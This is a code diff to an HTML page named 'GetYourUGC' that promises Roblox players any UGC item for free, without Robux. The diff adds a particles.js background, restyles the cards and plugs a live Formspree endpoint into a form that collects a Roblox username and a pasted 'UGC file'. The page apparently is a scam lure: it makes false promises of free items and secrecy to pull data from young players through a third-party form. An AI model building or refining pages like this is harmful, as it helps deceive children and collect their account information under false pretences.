@@ -6,9 +6,19 @@
   <style>
     body {
       margin: 0;
-      background: #0f0f0f;
       font-family: 'Segoe UI', sans-serif;
       color: white;
+    }
+
+    /* PARTICLES BACKGROUND */
+    #particles-js {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      background: #0f0f0f;
+      z-index: -1;
+      top: 0;
+      left: 0;
     }
 
     .main {
@@ -19,12 +29,13 @@
     }
 
     .container {
-      background: #1a1a1a;
+      background: rgba(26, 26, 26, 0.9);
       padding: 40px;
       border-radius: 15px;
       box-shadow: 0 0 25px rgba(0,0,0,0.6);
       width: 350px;
       text-align: center;
+      backdrop-filter: blur(10px);
     }
 
     h1 {
@@ -54,7 +65,7 @@
 
     input:focus, textarea:focus {
       outline: none;
-      box-shadow: 0 0 5px #4CAF50;
+      box-shadow: 0 0 8px #4CAF50;
     }
 
     button {
@@ -87,7 +98,7 @@
     }
 
     .card {
-      background: #1a1a1a;
+      background: rgba(26, 26, 26, 0.9);
       padding: 20px;
       border-radius: 12px;
       margin-bottom: 20px;
@@ -95,6 +106,7 @@
       text-align: left;
       transition: 0.3s;
       border: 1px solid #2a2a2a;
+      backdrop-filter: blur(10px);
     }
 
     .card:hover {
@@ -118,14 +130,17 @@
 
 <body>
 
+<!-- PARTICLES -->
+<div id="particles-js"></div>
+
 <div class="main">
 
-  <!-- FORM BOX -->
+  <!-- FORM -->
   <div class="container">
     <h1>GetYourUGC</h1>
     <p>Get any Roblox UGC you want for free!</p>
 
-    <form action="https://formspree.io/f/YOUR_FORMSPREE_ID" method="POST">
+    <form action="https://formspree.io/f/mkoppawp" method="POST">
       <input type="text" name="roblox_username" placeholder="Your Roblox Username" required>
       <textarea name="ugc_file" placeholder="Paste your UGC file here..." required></textarea>
       <button type="submit">Submit</button>
@@ -136,14 +151,14 @@
     </div>
   </div>
 
-  <!-- INFO CARDS -->
+  <!-- CARDS -->
   <div class="info">
 
     <div class="card">
       <h2>How this site works?</h2>
       <p>
         GetYourUGC is a simple platform where Roblox players can get any type of UGC for free.
-        We have a secured protocol website, so nobody knows how you got the UGC.
+        We provide a secure experience, so no one KNOWS how you got the UGC.
       </p>
     </div>
 
@@ -151,21 +166,55 @@
       <h2>How It Works?</h2>
       <p>
         Enter your Roblox username and paste your UGC file.
-        Once submitted, your request is reviewed and the UGC is added in your account within 24 hours.
+        Once submitted, your request is reviewed and processed within 24 hours.
       </p>
     </div>
 
     <div class="card">
       <h2>Why choose us?</h2>
       <p>
-        Fast processing, secure system, and a clean experience.
-        Built for players who need free UGC without any use of robux
+        Fast processing, clean interface, and easy usage.
+        Built for players who want UGC without any use of robux.
       </p>
     </div>
 
   </div>
 
 </div>
+
+<!-- PARTICLES SCRIPT -->
+<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+
+<script>
+particlesJS("particles-js", {
+  "particles": {
+    "number": { "value": 90 },
+    "color": { "value": "#4CAF50" },
+    "shape": { "type": "circle" },
+    "opacity": { "value": 0.5 },
+    "size": { "value": 3 },
+    "line_linked": {
+      "enable": true,
+      "distance": 150,
+      "color": "#4CAF50",
+      "opacity": 0.4,
+      "width": 1
+    },
+    "move": {
+      "enable": true,
+      "speed": 3
+    }
+  },
+  "interactivity": {
+    "events": {
+      "onhover": {
+        "enable": true,
+        "mode": "repulse"
+      }
+    }
+  }
+});
+</script>
 
 </body>
 </html>
